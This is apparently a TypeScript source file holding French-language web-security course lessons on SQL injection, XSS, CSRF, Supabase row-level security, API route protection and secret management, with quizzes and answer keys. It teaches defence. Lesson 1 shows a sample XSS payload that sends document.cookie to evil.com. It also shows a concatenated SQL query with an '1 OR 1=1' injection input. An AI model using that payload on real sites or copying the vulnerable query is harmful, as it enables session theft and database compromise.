// ═══════════════════════════════════════════════════
// MODULE 14 — Sécurité & bonnes pratiques
// 5 leçons — Format JSON blocs
// ═══════════════════════════════════════════════════

function blocks(b: object[]): string {
  return JSON.stringify(b);
}

export const V2_MODULE_14_LESSONS = [
  // ─── LEÇON 1 : Les failles courantes et comment les éviter ───
  {
    order: 1,
    module: 14,
    title: "Les failles courantes et comment les éviter",
    slug: "v2-failles-courantes-eviter",
    duration: "25 min",
    description: "Découvre les failles de sécurité les plus exploitées dans les applications web modernes : injection SQL, XSS, CSRF, mauvaise gestion des secrets. Apprends à les identifier et à les corriger avant qu'un attaquant ne le fasse.",
    content: blocks([
      { id: "1-1", type: "heading", level: 2, text: "La sécurité n'est pas une option" },
      { id: "1-2", type: "text", html: "<p>En tant que développeur IA, tu vas manipuler des données sensibles : informations clients, clés API, modèles entraînés, bases de données. Une seule faille peut détruire la confiance de tes clients et ta réputation en quelques heures.</p><p>Les attaquants ne ciblent pas seulement les grandes entreprises. Ils scannent <strong>automatiquement</strong> des millions de sites à la recherche de failles simples. Si ton app en a une, elle sera trouvée.</p>" },
      { id: "1-3", type: "callout", variant: "warning", html: "<strong>Réalité terrain :</strong> Plus de 40% des cyberattaques ciblent les PME et les projets SaaS. Un bot peut détecter une clé API exposée sur GitHub en moins de 30 secondes." },

      { id: "1-20", type: "heading", level: 3, text: "Le coût réel d'une faille de sécurité" },
      { id: "1-21", type: "text", html: "<p>Quand on parle de sécurité à un freelance, la réaction est souvent : 'Qui va attaquer MON petit projet ?' La réponse : des bots. Des scripts automatiques qui scannent l'intégralité d'internet 24h/24. Voici ce que ça coûte concrètement :</p><ul><li><strong>Clé API OpenAI exposée :</strong> Un bot la détecte en 30 secondes sur GitHub. Résultat : des centaines d'euros de requêtes frauduleuses sur ton compte en quelques heures.</li><li><strong>Base de données sans RLS :</strong> Toutes les données clients accessibles publiquement. Un concurrent ou un malveillant peut les télécharger. RGPD : amende potentielle.</li><li><strong>Injection SQL réussie :</strong> L'attaquant peut lire, modifier ou supprimer toute ta base. Si c'est un projet client, c'est ta responsabilité professionnelle qui est engagée.</li></ul><p>La sécurité n'est pas un luxe. C'est une assurance qui te coûte quelques heures de travail et t'évite des milliers d'euros de dégâts.</p>" },

      { id: "1-4", type: "separator", style: "dots" },

      { id: "1-5", type: "heading", level: 2, text: "Injection SQL : la faille historique" },
      { id: "1-6", type: "text", html: "<p>L'injection SQL se produit quand un attaquant insère du code SQL malveillant dans un champ de formulaire. Si ta requête est construite par concaténation de chaînes, le hacker peut lire, modifier ou supprimer toute ta base.</p><p><strong>Exemple dangereux :</strong> <code>SELECT * FROM users WHERE email = '\" + userInput + \"'</code></p><p><strong>Protection :</strong> Utilise toujours des requêtes paramétrées. Avec Supabase, le client JavaScript est protégé par défaut. Mais attention aux fonctions RPC custom où tu écris du SQL brut.</p>" },
      { id: "1-7", type: "callout", variant: "tip", html: "<strong>Bonne pratique :</strong> Ne construis JAMAIS une requête SQL par concaténation de chaînes. Utilise le query builder de Supabase ou les requêtes paramétrées de Prisma." },

      { id: "1-22", type: "heading", level: 3, text: "Injection SQL : avant/après" },
      { id: "1-23", type: "comparison", headers: ["Code vulnérable", "Code protégé"], rows: [
        { cells: ["db.query(`SELECT * FROM users WHERE id = ${userId}`)", "db.query('SELECT * FROM users WHERE id = $1', [userId])"] },
        { cells: ["Concaténation directe de l'input utilisateur", "Requête paramétrée avec placeholder"] },
        { cells: ["L'attaquant peut injecter : 1 OR 1=1", "L'input est traité comme une valeur, jamais comme du SQL"] },
        { cells: ["Supabase : rpc() avec SQL brut non sanitisé", "Supabase : .from('users').select('*').eq('id', userId)"] },
      ]},

      { id: "1-8", type: "separator", style: "line" },

      { id: "1-9", type: "heading", level: 2, text: "XSS : quand le JavaScript devient une arme" },
      { id: "1-10", type: "text", html: "<p>Le Cross-Site Scripting (XSS) permet à un attaquant d'injecter du JavaScript malveillant dans une page vue par d'autres utilisateurs. Un commentaire piégé, un champ de profil non sanitisé — et le hacker récupère les cookies de session de tous les visiteurs.</p><p><strong>Protection avec React :</strong> React échappe automatiquement le contenu dans le JSX. Mais si tu utilises <code>dangerouslySetInnerHTML</code> avec du contenu utilisateur non filtré, tu réintroduis la faille.</p>" },

      { id: "1-24", type: "heading", level: 3, text: "XSS en pratique : le scénario d'attaque" },
      { id: "1-25", type: "text", html: "<p>Imagine un chatbot IA où les utilisateurs peuvent donner un nom à leurs conversations. Si tu affiches ce nom sans l'échapper :</p><ol><li>L'utilisateur nomme sa conversation : <code>&lt;script&gt;fetch('https://evil.com?cookie='+document.cookie)&lt;/script&gt;</code></li><li>Si un admin consulte la liste des conversations dans un dashboard, le script s'exécute dans SON navigateur</li><li>Le hacker récupère le cookie de session de l'admin et prend le contrôle du compte admin</li></ol><p>C'est pour ça que React échappe automatiquement le contenu JSX. Mais attention aux cas où tu contournes cette protection :</p><ul><li><code>dangerouslySetInnerHTML</code> sans sanitisation (utilise DOMPurify si nécessaire)</li><li>Injection dans des attributs HTML dynamiques (href, src, style)</li><li>Template strings dans du JavaScript inline</li></ul>" },
      { id: "1-26", type: "callout", variant: "warning", html: "<strong>Règle absolue :</strong> Tout contenu venant d'un utilisateur (nom, email, commentaire, message, nom de fichier) est potentiellement dangereux. Ne fais JAMAIS confiance aux inputs utilisateur, même ceux de tes propres utilisateurs authentifiés." },

      { id: "1-11", type: "heading", level: 2, text: "CSRF et exposition de secrets" },
      { id: "1-12", type: "text", html: "<p><strong>CSRF (Cross-Site Request Forgery) :</strong> Un site malveillant envoie des requêtes à ton app en utilisant les cookies de l'utilisateur connecté. Protection : tokens CSRF, cookie SameSite, vérification du header Origin.</p><p><strong>Exposition de secrets :</strong> La faille la plus bête et la plus courante. Tu push ton fichier <code>.env</code> sur GitHub, un bot le détecte immédiatement et exploite tes clés API. La clé <code>anon</code> Supabase est publique, mais la clé <code>service_role</code> est secrète — elle bypass toutes les règles RLS.</p>" },
      { id: "1-13", type: "callout", variant: "warning", html: "<strong>Action immédiate :</strong> Vérifie maintenant ton historique Git avec <code>git log --all --full-history -- .env*</code>. Si tu as déjà commité un fichier .env, régénère immédiatement tes clés." },

      { id: "1-27", type: "heading", level: 3, text: "Les headers de sécurité HTTP indispensables" },
      { id: "1-28", type: "text", html: "<p>Les headers HTTP sont ta première ligne de défense côté navigateur. Voici ceux que tu dois configurer dans ton <code>next.config.js</code> :</p>" },
      { id: "1-29", type: "comparison", headers: ["Header", "Protège contre", "Valeur recommandée"], rows: [
        { cells: ["Content-Security-Policy (CSP)", "XSS, injection de scripts", "default-src 'self'; script-src 'self'"] },
        { cells: ["X-Frame-Options", "Clickjacking (iframe piégée)", "DENY ou SAMEORIGIN"] },
        { cells: ["X-Content-Type-Options", "MIME sniffing", "nosniff"] },
        { cells: ["Strict-Transport-Security", "Downgrade HTTPS → HTTP", "max-age=31536000; includeSubDomains"] },
        { cells: ["Referrer-Policy", "Fuite d'URL dans les headers", "strict-origin-when-cross-origin"] },
      ]},
      { id: "1-30", type: "callout", variant: "tip", html: "<strong>Astuce :</strong> Teste tes headers avec <a href='https://securityheaders.com'>securityheaders.com</a>. Score visé : A ou A+. C'est gratuit et ça prend 10 secondes." },

      { id: "1-14", type: "checklist", title: "Checklist anti-failles", items: [
        { id: "c1", text: "Requêtes SQL paramétrées partout (pas de concaténation)" },
        { id: "c2", text: "Pas de dangerouslySetInnerHTML avec du contenu utilisateur" },
        { id: "c3", text: "Tokens CSRF sur les formulaires sensibles" },
        { id: "c4", text: ".env dans le .gitignore" },
        { id: "c5", text: "Clé service_role jamais côté client" },
        { id: "c6", text: "Headers de sécurité configurés (CSP, X-Frame-Options)" },
        { id: "c7", text: "Score A+ sur securityheaders.com" },
        { id: "c8", text: "Historique Git vérifié pour les fichiers .env" },
      ]},
    ]),
    exercise: "<h3>Exercice : Audit de sécurité express</h3><p>Fais un audit rapide de ton projet actuel :</p><ol><li>Vérifie ton historique Git pour les fichiers .env commités</li><li>Cherche toute utilisation de <code>dangerouslySetInnerHTML</code> dans ton code</li><li>Vérifie que ta clé <code>service_role</code> n'apparaît nulle part côté client</li><li>Liste toutes les API Routes qui ne vérifient pas l'authentification</li><li>Documente chaque faille trouvée et propose un correctif</li></ol>",
    quiz: [
      { type: "mcq", question: "Quelle est la meilleure protection contre les injections SQL ?", options: JSON.stringify(["Filtrer les caractères spéciaux manuellement", "Utiliser des requêtes paramétrées", "Limiter la longueur des champs de formulaire", "Utiliser HTTPS"]), correctAnswer: "Utiliser des requêtes paramétrées", explanation: "Les requêtes paramétrées séparent le code SQL des données utilisateur, rendant l'injection impossible. Le client Supabase et Prisma les utilisent par défaut." },
      { type: "true_false", question: "React protège automatiquement contre les attaques XSS dans le JSX standard.", options: JSON.stringify(["Vrai", "Faux"]), correctAnswer: "Vrai", explanation: "React échappe automatiquement le contenu injecté dans le JSX. Cependant, dangerouslySetInnerHTML contourne cette protection et peut réintroduire des failles XSS si utilisé avec du contenu utilisateur non sanitisé." },
      { type: "mcq", question: "Qu'est-ce qu'une attaque CSRF ?", options: JSON.stringify(["Un virus installé sur le serveur", "Un site malveillant qui envoie des requêtes en utilisant les cookies de session de l'utilisateur", "Un hacker qui devine le mot de passe par force brute", "Une interception du trafic réseau"]), correctAnswer: "Un site malveillant qui envoie des requêtes en utilisant les cookies de session de l'utilisateur", explanation: "Le CSRF exploite la confiance du navigateur : un site tiers déclenche des actions sur ton app en utilisant les cookies de l'utilisateur connecté, sans son consentement." },
      { type: "true_false", question: "La clé anon de Supabase est secrète et ne doit jamais apparaître dans le code côté client.", options: JSON.stringify(["Vrai", "Faux"]), correctAnswer: "Faux", explanation: "La clé anon est conçue pour être publique et utilisée côté client. C'est la clé service_role qui est secrète et qui bypass toutes les règles RLS." },
      { type: "mcq", question: "Quel outil permet de vérifier si un fichier .env a été commité dans l'historique Git ?", options: JSON.stringify(["git status", "git log --all --full-history -- .env*", "git diff .env", "git show .env"]), correctAnswer: "git log --all --full-history -- .env*", explanation: "Cette commande parcourt tout l'historique Git (toutes les branches) pour trouver les commits qui ont touché des fichiers .env. Même si le fichier a été supprimé depuis, il reste dans l'historique." },
      { type: "mcq", question: "Quel header HTTP aide à prévenir les attaques par clickjacking ?", options: JSON.stringify(["Content-Type", "X-Frame-Options", "Authorization", "Cache-Control"]), correctAnswer: "X-Frame-Options", explanation: "X-Frame-Options empêche ton site d'être chargé dans une iframe sur un site tiers, ce qui prévient les attaques par clickjacking où un attaquant superpose une interface invisible pour piéger l'utilisateur." },
    ],
  },

  // ─── LEÇON 2 : Row Level Security (RLS) sur Supabase ───
  {
    order: 2,
    module: 14,
    title: "Row Level Security (RLS) sur Supabase",
    slug: "v2-rls-supabase-securite",
    duration: "25 min",
    description: "Maîtrise le mécanisme de sécurité le plus puissant de Supabase. Apprends à écrire des policies RLS efficaces, à les tester et à éviter les pièges classiques qui laissent tes données exposées.",
    content: blocks([
      { id: "2-1", type: "heading", level: 2, text: "RLS : ta première ligne de défense" },
      { id: "2-2", type: "text", html: "<p>Row Level Security est un mécanisme PostgreSQL qui permet de contrôler l'accès aux données <strong>ligne par ligne</strong>. Avec RLS, chaque utilisateur ne peut accéder qu'à ses propres données, même s'il tente de manipuler l'API directement.</p><p>Sans RLS, toute personne ayant la clé <code>anon</code> (qui est publique) peut lire l'intégralité de ta table. C'est comme laisser la porte de ton bureau ouverte avec tous les dossiers clients sur la table.</p>" },
      { id: "2-3", type: "callout", variant: "warning", html: "<strong>Règle absolue :</strong> Active RLS sur CHAQUE table contenant des données utilisateurs. Une table sans RLS est une table publique." },

      { id: "2-20", type: "heading", level: 3, text: "Comprendre le problème que RLS résout" },
      { id: "2-21", type: "text", html: "<p>Sans RLS, voici ce qui se passe concrètement. Ta clé <code>anon</code> Supabase est dans ton code frontend — elle est donc publique. N'importe qui peut ouvrir les DevTools du navigateur, récupérer cette clé, et faire :</p><pre><code>// N'importe qui peut exécuter ça\nconst { data } = await supabase\n  .from('invoices')\n  .select('*')\n\n// Résultat : TOUTES les factures de TOUS les utilisateurs</code></pre><p>Avec RLS activé et une policy correcte, la même requête ne retourne que les factures de l'utilisateur connecté. Si l'utilisateur n'est pas connecté, elle ne retourne rien. Le filtrage se fait au niveau PostgreSQL, pas au niveau de ton code JavaScript — c'est incontournable et incassable.</p>" },
      { id: "2-22", type: "callout", variant: "info", html: "<strong>Pourquoi c'est mieux qu'un filtre JavaScript :</strong> Un filtre dans ton code (<code>.eq('user_id', userId)</code>) peut être contourné si quelqu'un appelle l'API directement. RLS est un filtre au niveau de la base de données — impossible à contourner, même en manipulant l'API." },

      { id: "2-4", type: "separator", style: "dots" },

      { id: "2-5", type: "heading", level: 2, text: "Anatomie d'une policy RLS" },
      { id: "2-6", type: "text", html: "<p>Une policy RLS est une règle SQL qui s'exécute automatiquement à chaque requête. Elle utilise deux clauses :</p><ul><li><strong>USING :</strong> filtre les lignes existantes (lesquelles tu peux voir, modifier, supprimer)</li><li><strong>WITH CHECK :</strong> valide les nouvelles données (est-ce que cette insertion est autorisée ?)</li></ul><p>La fonction <code>auth.uid()</code> retourne l'ID de l'utilisateur connecté. C'est la base de presque toutes les policies.</p>" },

      { id: "2-7", type: "comparison", headers: ["Opération", "Clause utilisée", "Ce qu'elle contrôle"], rows: [
        { cells: ["SELECT", "USING", "Quelles lignes l'utilisateur peut lire"] },
        { cells: ["INSERT", "WITH CHECK", "Quelles données l'utilisateur peut insérer"] },
        { cells: ["UPDATE", "USING + WITH CHECK", "Quelles lignes il peut modifier et les nouvelles valeurs"] },
        { cells: ["DELETE", "USING", "Quelles lignes il peut supprimer"] },
      ]},
      { id: "2-8", type: "separator", style: "line" },

      { id: "2-9", type: "heading", level: 2, text: "Écrire tes policies : le template standard" },
      { id: "2-10", type: "text", html: "<p>Voici le set de policies que tu devrais appliquer sur chaque table utilisateur :</p><pre><code>-- 1. Activer RLS\nALTER TABLE ma_table ENABLE ROW LEVEL SECURITY;\n\n-- 2. SELECT : voir ses propres données\nCREATE POLICY \"select_own\" ON ma_table\nFOR SELECT USING (auth.uid() = user_id);\n\n-- 3. INSERT : créer uniquement pour soi\nCREATE POLICY \"insert_own\" ON ma_table\nFOR INSERT WITH CHECK (auth.uid() = user_id);\n\n-- 4. UPDATE : modifier ses propres lignes\nCREATE POLICY \"update_own\" ON ma_table\nFOR UPDATE USING (auth.uid() = user_id)\nWITH CHECK (auth.uid() = user_id);\n\n-- 5. DELETE : supprimer ses propres lignes\nCREATE POLICY \"delete_own\" ON ma_table\nFOR DELETE USING (auth.uid() = user_id);</code></pre>" },

      { id: "2-23", type: "heading", level: 3, text: "Policies avancées : admin, organisations, données publiques" },
      { id: "2-24", type: "text", html: "<p>Le template standard couvre le cas 'chaque utilisateur voit ses données'. Mais tu auras souvent des cas plus complexes :</p>" },
      { id: "2-25", type: "steps", steps: [
        { title: "Policy admin : voir toutes les données", description: "CREATE POLICY \"admin_select\" ON ma_table FOR SELECT USING (auth.uid() IN (SELECT id FROM users WHERE role = 'admin')). L'admin peut voir toutes les lignes, les autres utilisateurs seulement les leurs." },
        { title: "Policy organisation : partage par équipe", description: "CREATE POLICY \"team_select\" ON ma_table FOR SELECT USING (org_id IN (SELECT org_id FROM memberships WHERE user_id = auth.uid())). Les membres d'une même organisation peuvent voir les données partagées." },
        { title: "Policy publique : données visibles par tous", description: "CREATE POLICY \"public_select\" ON ma_table FOR SELECT USING (is_public = true OR auth.uid() = user_id). Les données marquées publiques sont visibles par tous, les autres uniquement par leur propriétaire." },
        { title: "Policy en lecture seule pour les invités", description: "CREATE POLICY \"guest_select\" ON ma_table FOR SELECT USING (true). Combiné avec aucune policy INSERT/UPDATE/DELETE, les utilisateurs anonymes peuvent lire mais pas modifier." },
      ]},

      { id: "2-11", type: "heading", level: 2, text: "Les pièges classiques RLS" },
      { id: "2-12", type: "steps", steps: [
        { title: "Oublier d'activer RLS", description: "Par défaut, les nouvelles tables n'ont PAS RLS activé. Tu dois le faire manuellement avec ALTER TABLE ... ENABLE ROW LEVEL SECURITY." },
        { title: "Policy trop permissive", description: "Une policy avec USING (true) rend la table publique. Vérifie toujours que tu filtres par auth.uid()." },
        { title: "Oublier la policy INSERT", description: "Tu protèges le SELECT mais pas l'INSERT ? N'importe qui peut insérer des données dans ta table." },
        { title: "Ne pas tester", description: "Utilise le SQL Editor de Supabase avec SET ROLE authenticated pour simuler un utilisateur et vérifier tes policies." },
      ]},

      { id: "2-26", type: "heading", level: 3, text: "Comment tester tes policies RLS" },
      { id: "2-27", type: "text", html: "<p>Les policies non testées ne valent rien. Voici la procédure de test :</p><ol><li><strong>Ouvre le SQL Editor</strong> dans ton dashboard Supabase</li><li><strong>Simule un utilisateur :</strong> <code>SET ROLE authenticated; SET request.jwt.claims = '{\"sub\": \"user-id-1\"}';</code></li><li><strong>Teste chaque opération :</strong> SELECT, INSERT, UPDATE, DELETE</li><li><strong>Vérifie l'isolation :</strong> Change le user-id et vérifie que tu ne vois PAS les données de l'autre utilisateur</li><li><strong>Teste le cas non-authentifié :</strong> <code>SET ROLE anon;</code> et vérifie que les données sensibles sont inaccessibles</li></ol><p>Fais ce test pour CHAQUE table sensible. Ça prend 5 minutes par table et c'est la différence entre une app sécurisée et une fuite de données.</p>" },
      { id: "2-28", type: "callout", variant: "warning", html: "<strong>Piège du service_role :</strong> Si tu utilises le client Supabase avec la clé <code>service_role</code> dans tes API Routes, RLS est bypassé. C'est voulu (pour les opérations admin), mais assure-toi de TOUJOURS vérifier l'authentification dans tes API Routes avant d'utiliser ce client." },

      { id: "2-13", type: "callout", variant: "tip", html: "<strong>Astuce pro :</strong> Dans le dashboard Supabase, va dans Authentication > Policies pour visualiser et gérer toutes tes policies sans écrire de SQL." },
    ]),
    exercise: "<h3>Exercice : Sécuriser tes tables avec RLS</h3><p>Applique RLS sur ton projet :</p><ol><li>Ouvre ton projet Supabase et liste toutes tes tables</li><li>Pour chaque table, vérifie si RLS est activé (icône cadenas dans le dashboard)</li><li>Écris les 4 policies standard (SELECT, INSERT, UPDATE, DELETE) pour ta table la plus sensible</li><li>Teste avec le SQL Editor en simulant un utilisateur différent</li><li>Crée une policy pour un cas avancé : un admin qui peut voir toutes les lignes</li></ol>",
    quiz: [
      { type: "mcq", question: "Que se passe-t-il si RLS est activé mais qu'aucune policy n'est définie ?", options: JSON.stringify(["Toutes les données sont accessibles", "Aucune donnée n'est accessible", "Seul l'admin peut accéder aux données", "Les données sont en lecture seule"]), correctAnswer: "Aucune donnée n'est accessible", explanation: "Quand RLS est activé sans policy, toutes les opérations sont bloquées par défaut. C'est le principe du deny by default : il faut explicitement autoriser chaque type d'accès." },
      { type: "true_false", question: "Par défaut, les nouvelles tables Supabase ont RLS activé automatiquement.", options: JSON.stringify(["Vrai", "Faux"]), correctAnswer: "Faux", explanation: "Les nouvelles tables n'ont PAS RLS activé par défaut. Tu dois l'activer manuellement, ce qui est un piège classique pour les débutants." },
      { type: "mcq", question: "Quelle fonction retourne l'ID de l'utilisateur connecté dans une policy RLS ?", options: JSON.stringify(["current_user()", "session_user()", "auth.uid()", "get_user_id()"]), correctAnswer: "auth.uid()", explanation: "auth.uid() est la fonction Supabase qui retourne l'UUID de l'utilisateur authentifié. Elle est injectée automatiquement dans chaque requête." },
      { type: "mcq", question: "Quelle clause RLS utilise-t-on pour valider les données d'un INSERT ?", options: JSON.stringify(["USING", "WITH CHECK", "WHERE", "HAVING"]), correctAnswer: "WITH CHECK", explanation: "WITH CHECK valide les nouvelles données lors d'un INSERT. USING filtre les lignes existantes pour SELECT, UPDATE et DELETE." },
      { type: "true_false", question: "Une policy RLS avec USING (true) rend la table accessible à tous les utilisateurs authentifiés.", options: JSON.stringify(["Vrai", "Faux"]), correctAnswer: "Vrai", explanation: "USING (true) signifie que la condition est toujours vraie, donc tous les utilisateurs authentifiés peuvent accéder à toutes les lignes. C'est à éviter sauf pour des tables volontairement publiques." },
      { type: "mcq", question: "Tu as activé RLS sur une table avec une policy SELECT mais pas de policy INSERT. Que se passe-t-il quand un utilisateur tente un INSERT ?", options: JSON.stringify(["L'insertion réussit", "L'insertion est refusée", "L'insertion réussit mais les données sont invisibles", "Supabase crée une policy automatiquement"]), correctAnswer: "L'insertion est refusée", explanation: "Avec RLS activé, toute opération sans policy explicite est refusée. Pas de policy INSERT = pas d'insertion possible." },
    ],
  },

  // ─── LEÇON 3 : Sécuriser les API Routes + gestion des secrets ───
  {
    order: 3,
    module: 14,
    title: "Sécuriser les API Routes + gestion des secrets",
    slug: "v2-securiser-api-routes-secrets",
    duration: "20 min",
    description: "Protège tes API Routes Next.js avec validation, authentification et rate limiting. Apprends à gérer tes secrets proprement avec les variables d'environnement.",
    content: blocks([
      { id: "3-1", type: "heading", level: 2, text: "Tes API Routes sont des portes ouvertes" },
      { id: "3-2", type: "text", html: "<p>Chaque API Route dans Next.js est un endpoint public accessible par n'importe qui. Pas besoin d'utiliser ton interface — un simple <code>curl</code> ou Postman suffit pour envoyer des requêtes. Sans protection, un attaquant peut :</p><ul><li>Envoyer des données malformées pour crasher ton app</li><li>Appeler ton API en boucle pour épuiser tes crédits (OpenAI, Resend...)</li><li>Accéder à des données sans être authentifié</li></ul>" },
      { id: "3-3", type: "callout", variant: "warning", html: "<strong>Scénario réel :</strong> Un développeur expose une API Route qui appelle GPT-4 sans vérifier l'authentification. Un bot la découvre et envoie 10 000 requêtes. Résultat : une facture OpenAI de 500€ en une nuit." },

      { id: "3-20", type: "heading", level: 3, text: "Comment un attaquant trouve tes API Routes" },
      { id: "3-21", type: "text", html: "<p>Tu penses que tes API Routes sont 'cachées' parce qu'elles ne sont pas liées dans ton interface ? Détrompe-toi. Un attaquant peut les trouver facilement :</p><ul><li><strong>DevTools du navigateur :</strong> L'onglet Network montre toutes les requêtes que ton frontend envoie. Toutes tes routes API sont visibles.</li><li><strong>Analyse du code source :</strong> Si ton repo est public, les routes sont dans le dossier <code>app/api/</code></li><li><strong>Bruteforce :</strong> Des outils scannent automatiquement les chemins courants : /api/users, /api/admin, /api/chat, etc.</li><li><strong>Fichier sitemap ou robots.txt :</strong> Parfois, les routes API apparaissent dans des fichiers de configuration mal configurés</li></ul><p>Conclusion : considère que TOUTES tes API Routes sont publiques et connues. Protège-les en conséquence.</p>" },

      { id: "3-4", type: "separator", style: "dots" },

      { id: "3-5", type: "heading", level: 2, text: "Les 3 couches de protection" },
      { id: "3-6", type: "steps", steps: [
        { title: "Couche 1 : Authentification", description: "Vérifie que l'utilisateur est connecté avant de traiter la requête. Utilise getServerSession() ou le middleware Supabase pour valider le token JWT." },
        { title: "Couche 2 : Validation des données", description: "Valide chaque champ avec Zod avant de l'utiliser. Ne fais jamais confiance aux données entrantes, même si elles viennent de ton propre frontend." },
        { title: "Couche 3 : Rate limiting", description: "Limite le nombre de requêtes par utilisateur par minute. Utilise une librairie comme upstash/ratelimit pour protéger tes endpoints coûteux." },
      ]},

      { id: "3-22", type: "heading", level: 3, text: "Template complet d'une API Route sécurisée" },
      { id: "3-23", type: "text", html: "<p>Voici le template que tu devrais utiliser pour CHAQUE API Route qui manipule des données sensibles ou fait des appels payants :</p><pre><code>import { NextRequest, NextResponse } from 'next/server';\nimport { z } from 'zod';\nimport { createClient } from '@/lib/supabase/server';\n\nconst schema = z.object({\n  message: z.string().min(1).max(500),\n});\n\nexport async function POST(req: NextRequest) {\n  // 1. AUTHENTIFICATION\n  const supabase = createClient();\n  const { data: { user } } = await supabase.auth.getUser();\n  if (!user) {\n    return NextResponse.json(\n      { error: 'Non autorisé' },\n      { status: 401 }\n    );\n  }\n\n  // 2. VALIDATION\n  const body = await req.json();\n  const result = schema.safeParse(body);\n  if (!result.success) {\n    return NextResponse.json(\n      { error: result.error.issues },\n      { status: 400 }\n    );\n  }\n\n  // 3. LOGIQUE MÉTIER\n  try {\n    // ... ton code ici\n    return NextResponse.json({ success: true });\n  } catch (error) {\n    console.error('API Error:', error);\n    return NextResponse.json(\n      { error: 'Erreur serveur' },\n      { status: 500 }\n    );\n  }\n}</code></pre>" },
      { id: "3-24", type: "callout", variant: "tip", html: "<strong>Conseil :</strong> Crée un helper <code>requireAuth()</code> que tu réutilises dans toutes tes routes. Ça évite de copier-coller la logique d'auth partout et ça réduit le risque d'oublier la vérification." },

      { id: "3-7", type: "separator", style: "line" },

      { id: "3-8", type: "heading", level: 2, text: "Validation avec Zod : le standard" },
      { id: "3-9", type: "text", html: "<p>Zod te permet de définir un schéma de validation et de vérifier les données entrantes en une ligne :</p><pre><code>import { z } from 'zod';\n\nconst schema = z.object({\n  email: z.string().email(),\n  message: z.string().min(1).max(500),\n});\n\n// Dans ton API Route\nconst result = schema.safeParse(body);\nif (!result.success) {\n  return NextResponse.json(\n    { error: result.error.issues },\n    { status: 400 }\n  );\n}</code></pre>" },

      { id: "3-25", type: "heading", level: 3, text: "Les validations Zod que tu utilises le plus souvent" },
      { id: "3-26", type: "comparison", headers: ["Type de donnée", "Validation Zod", "Ce que ça protège"], rows: [
        { cells: ["Email", "z.string().email()", "Empêche les injections dans les envois d'email"] },
        { cells: ["URL", "z.string().url()", "Empêche les redirections malveillantes"] },
        { cells: ["ID", "z.string().uuid()", "Empêche les injections dans les requêtes DB"] },
        { cells: ["Texte libre", "z.string().min(1).max(1000)", "Empêche les payloads gigantesques qui crashent ton serveur"] },
        { cells: ["Nombre", "z.number().int().positive().max(100)", "Empêche les valeurs aberrantes (pagination, quantités)"] },
        { cells: ["Enum", "z.enum(['draft', 'published'])", "Empêche les valeurs non prévues dans les statuts"] },
      ]},

      { id: "3-10", type: "heading", level: 2, text: "Gestion des secrets : les règles d'or" },
      { id: "3-11", type: "text", html: "<p>Les variables d'environnement sont le seul endroit sûr pour stocker tes secrets. Voici les règles :</p><ul><li><strong>Jamais dans le code :</strong> Pas de clé API en dur dans un fichier .ts</li><li><strong>Jamais dans Git :</strong> Le fichier <code>.env.local</code> doit être dans le <code>.gitignore</code></li><li><strong>Préfixe NEXT_PUBLIC_ :</strong> Seules les variables préfixées sont accessibles côté client. Les autres restent côté serveur</li><li><strong>Rotation régulière :</strong> Change tes clés tous les 3 mois minimum</li></ul>" },
      { id: "3-12", type: "callout", variant: "tip", html: "<strong>Astuce Vercel :</strong> Utilise les Environment Variables dans les settings de ton projet Vercel. Elles sont chiffrées et injectées automatiquement au build. Utilise des valeurs différentes pour Preview, Development et Production." },

      { id: "3-27", type: "heading", level: 3, text: "Que faire si tu as déjà leaké une clé" },
      { id: "3-28", type: "text", html: "<p>Tu viens de réaliser que tu as commité ton fichier .env sur GitHub. Pas de panique, mais agis VITE :</p><ol><li><strong>Régénère IMMÉDIATEMENT toutes les clés :</strong> OpenAI, Supabase service_role, Stripe, Resend... Chaque seconde compte.</li><li><strong>Supprime le fichier de Git :</strong> <code>git rm --cached .env</code> et ajoute-le au .gitignore</li><li><strong>L'historique Git contient encore la clé :</strong> Même si tu supprimes le fichier, il reste dans l'historique. Tu peux utiliser <code>git filter-branch</code> ou BFG Repo-Cleaner pour purger l'historique, mais c'est souvent plus simple de simplement régénérer les clés.</li><li><strong>Vérifie tes factures :</strong> Connecte-toi à tes dashboards (OpenAI, Stripe, etc.) et vérifie s'il y a des usages anormaux</li><li><strong>Mets un plafond de dépense :</strong> Sur OpenAI, configure un usage limit. Sur Stripe, active les alertes de fraude.</li></ol>" },

      { id: "3-13", type: "comparison", headers: ["Variable", "Accessible côté client ?", "Usage"], rows: [
        { cells: ["NEXT_PUBLIC_SUPABASE_URL", "Oui", "URL publique Supabase"] },
        { cells: ["NEXT_PUBLIC_SUPABASE_ANON_KEY", "Oui", "Clé publique pour le client"] },
        { cells: ["SUPABASE_SERVICE_ROLE_KEY", "Non (serveur uniquement)", "Clé admin, bypass RLS"] },
        { cells: ["OPENAI_API_KEY", "Non (serveur uniquement)", "Clé API OpenAI"] },
      ]},
    ]),
    exercise: "<h3>Exercice : Sécuriser une API Route</h3><p>Prends une API Route existante dans ton projet et applique les 3 couches de protection :</p><ol><li>Ajoute la vérification d'authentification avec getServerSession()</li><li>Crée un schéma Zod pour valider les données entrantes</li><li>Ajoute un rate limiting de 10 requêtes par minute par utilisateur</li><li>Vérifie que tes variables d'environnement sensibles n'ont PAS le préfixe NEXT_PUBLIC_</li><li>Teste avec Postman : envoie une requête sans token, avec des données invalides, et en boucle rapide</li></ol>",
    quiz: [
      { type: "mcq", question: "Quel préfixe rend une variable d'environnement accessible côté client dans Next.js ?", options: JSON.stringify(["PUBLIC_", "CLIENT_", "NEXT_PUBLIC_", "EXPOSED_"]), correctAnswer: "NEXT_PUBLIC_", explanation: "Seules les variables préfixées par NEXT_PUBLIC_ sont incluses dans le bundle client. Toutes les autres restent côté serveur et ne sont pas accessibles depuis le navigateur." },
      { type: "true_false", question: "Il est sûr de mettre la clé OPENAI_API_KEY avec le préfixe NEXT_PUBLIC_ pour l'utiliser dans un composant React.", options: JSON.stringify(["Vrai", "Faux"]), correctAnswer: "Faux", explanation: "Ajouter NEXT_PUBLIC_ à une clé secrète l'expose côté client. N'importe qui peut ouvrir les DevTools et la récupérer. Les clés API sensibles doivent rester côté serveur uniquement." },
      { type: "mcq", question: "Quelle librairie est le standard pour valider les données entrantes dans une API Route Next.js ?", options: JSON.stringify(["Joi", "Yup", "Zod", "Validator.js"]), correctAnswer: "Zod", explanation: "Zod est le standard dans l'écosystème Next.js/TypeScript grâce à son inférence de types automatique et sa syntaxe concise. Il est utilisé par tRPC, React Hook Form et de nombreux frameworks." },
